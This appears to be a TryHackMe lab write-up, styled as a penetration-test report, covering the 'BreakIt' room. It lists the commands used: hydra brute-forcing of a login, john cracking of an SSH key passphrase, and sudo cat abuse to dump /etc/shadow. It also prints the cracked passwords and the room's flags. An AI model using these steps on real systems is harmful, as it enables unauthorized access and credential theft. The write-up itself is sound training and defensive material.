# Vulnerability Assessment and Penetration Testing (VAPT) Report – BreakIt

**Prepared by:** Nishanth Antony  
**Date:** August 21, 2025  
**Difficulty:** Easy  
**Category:** Web Exploitation / Privilege Escalation  
**Platform:** TryHackMe (THM)  

---

## 1. Reconnaissance Steps  
**Objective:** Identify active hosts, open ports, services, and vulnerabilities.  
**Commands Used:**  
```bash
ping <target_ip>  
nmap -p- --min-rate=1000 -sV <target_ip> -T4 -v  
gobuster dir -u http://<target_ip>/ -w /usr/share/wordlists/dirb/common.txt
```

**Findings:**  
- Host confirmed online via ping.  
- Open ports: SSH (22, OpenSSH 7.6p1), HTTP (80, Apache 2.4.29).  
- Web enumeration revealed `/admin` directory with a login page.  
- HTML comment in `/admin` disclosed username `admin`.  

---

## 2. Exploitation Process  
**Step 1 – Web Enumeration (Port 80)**  
- Used gobuster to find `/admin` directory:
  ```bash
  gobuster dir -u http://<target_ip>/ -w /usr/share/wordlists/dirb/common.txt
  ```  
- `/admin` login page HTML comment revealed username `admin`.  

**Step 2 – Brute-Forcing Admin Credentials**  
- Brute-forced `/admin` login credentials:
  ```bash
  hydra -l admin -P /usr/share/wordlists/rockyou.txt <target_ip> http-post-form "/admin/:user=^USER^&pass=^PASS^:Invalid"
  ```  
- Result: Password `xavier`.  

**Step 3 – Admin Panel Access**  
- Logged into `/admin` with admin:xavier.  
- Obtained web flag: `THM{brut3_f0rce_is_e4sy}` and an RSA private key file (id_rsa).  

**Step 4 – SSH Key Analysis**  
- Copied id_rsa and converted to hash:
  ```python
  python3 /usr/share/john/ssh2john.py id_rsa > id_rsa.hash
  ```
- Cracked passphrase with john:
  ```bash
  john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash
  ```
- Result: Passphrase `rockinroll`.  
- Webpage hinted RSA key belonged to user `john`.  

**Step 5 – SSH Access as John**  
- Logged in via SSH:  
  `ssh -i id_rsa john@<target_ip>` with passphrase `rockinroll`.  
- Found user.txt in /home/john: `THM{a_password_is_not_a_barrier}`.  

**Step 6 – Privilege Escalation**  
- Checked sudo permissions:
```bash
  sudo -l
```
- Found john could run `/bin/cat` as root without a password.  
- Exploited to read /root/root.txt:
```bash
  sudo cat /root/root.txt
```
- Result: Root flag `THM{pr1v1l3g3_3sc4l4t10n}`.  
- Copied /etc/shadow to /tmp/shadow:
```bash
  sudo cat /etc/shadow > /tmp/shadow
```
- Cracked root password from /tmp/shadow:
  ```bash
  john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
  ``` 
- Result: Password `football`.  

---

## 3. Proof of Concept (PoC)  
- **Web Brute Force:**
```bash
  hydra -l admin -P /usr/share/wordlists/rockyou.txt <target_ip> http-post-form "/admin/:user=^USER^&pass=^PASS^:Invalid"
```  
  Obtained admin:xavier.  
- **SSH Key Cracking:**
```bash
  john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash
```
  Cracked passphrase rockinroll.  
- **Privilege Escalation:**
```bash
  sudo cat /root/root.txt
```
  Accessed root flag.  
- **Password Hash Cracking:**
  ```bash
  john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
  ```
  Cracked root:football.  

---

## 4. Privilege Escalation  
- Exploited sudo permission allowing john to run `/bin/cat` as root.  
- Read /root/root.txt and /etc/shadow, enabling root password cracking.  

---

## 5. Mitigation Recommendations  
- **Web Server Hardening:**  
  - Remove sensitive information (e.g., username hints) from HTML comments.  
  - Restrict `/admin` access with stronger authentication mechanisms.  
- **Authentication Security:**  
  - Enforce complex passwords for web and SSH accounts.  
  - Use strong, unique passphrases for SSH keys.  
- **Sudo Configuration:**  
  - Limit sudo commands to specific, necessary files.  
  - Avoid allowing powerful commands like `/bin/cat` without restrictions.  
- **File Security:**  
  - Protect sensitive files (e.g., id_rsa, /etc/shadow) with strict permissions (chmod 600).  
  - Avoid storing private keys in accessible web directories.  
- **Patch Management:**  
  - Update Apache and OpenSSH to the latest versions.  
  - Implement monitoring for unauthorized access attempts.  

---

## 6. Lessons Learned  
- **Weak Credentials:** Simple passwords (e.g., xavier) are vulnerable to brute-force attacks.  
- **Information Disclosure:** HTML comments can leak critical information like usernames.  
- **Sudo Misconfiguration:** Overly permissive sudo rules enable easy privilege escalation.  
- **SSH Key Security:** Weak passphrases and accessible private keys risk unauthorized access.  

---

## 7. Skills Practiced  
- Network scanning (`nmap`, `ping`)  
- Web directory enumeration (`gobuster`)  
- Credential brute-forcing (`hydra`)  
- SSH key cracking (`john`, `ssh2john`)  
- Sudo privilege escalation  
- Password hash cracking  
- Secure reporting and mitigation strategies  
